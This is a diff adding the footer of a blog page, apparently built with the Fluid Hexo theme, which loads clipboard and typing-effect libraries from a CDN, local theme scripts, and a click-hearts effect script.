+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
